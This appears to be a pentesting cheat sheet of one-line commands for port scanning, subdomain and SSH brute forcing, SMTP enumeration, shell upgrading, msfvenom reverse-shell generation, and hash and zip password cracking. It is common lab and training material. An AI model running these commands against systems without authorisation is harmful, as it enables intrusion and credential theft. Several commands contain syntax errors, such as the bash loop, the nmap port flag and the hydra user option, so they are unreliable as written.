# PentestingGuide

---

## Bash

Grep emails: `for mail in $(cat MAILS.txt) do; echo $mail | grep -Eho "[[:graph:]]+@[[:graph:]]+"`

## Nmap scans

Fast scan: `nmap -p- 500 -T5 -n -Pn HOST -oN allPorts`

Services versions and basic scripts: `nmap -p OPEN_PORTS -sC -sV HOST -oN sCsV`

## DNS 

Subdomains list: https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt

Subdomains bruteforce: `wfuzz -w SUBDOMAINS.txt -H "Host: FUZZ.HOST" --hc 301 -u IP`

## HTTP [80]

Basic info: `whatweb HOST`

Information crawler: `nmap --script http-grep -p80 HOST`

CMS config search: `nmap --script http-config-backup -p80 HOST`

Vuln scanner (https://github.com/scipag/vulscan): `nmap --script vulscan/vulscan -sC -sV -p80 HOST`

Wordpress enum: `nmap --script http-wordpress-enum -p80 HOST`

## SSH [22]

SSH bruteforce: `hydra -l USERS.txt -p PASS.txt HOST ssh`

## SMTP [25]

Connect to SMTP server: `telnet HOST 25`

SMTP enum: Use Metasploit auxiliary/scanner/smtp/smtp_enum

Send email: `swaks --to DST@HOST.COM --from SRC@HOST.COM --header "HEADER" --body "BODY" --server HOST`

## Linux 

Spawn a TTY: `python -c 'import pty; pty.spawn("/bin/sh")'`

`/bin/sh -i`

`/usr/bin/script -qc /bin/bash /dev/null`

Linux enumeration: https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh

## Windows

Generate a reverse shell: `msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f exe -o reverse.exe`

## Hashes

Identify hash type: `hash-identifier`

Hash cracker: `hashcat -a ATTACK_MODE -m HASH_TYPE HASH DICTIONARY.txt`

## Zip files

Bruteforce password: `fcrackzip ZIP.zip -D -p PASSWORDS.txt`










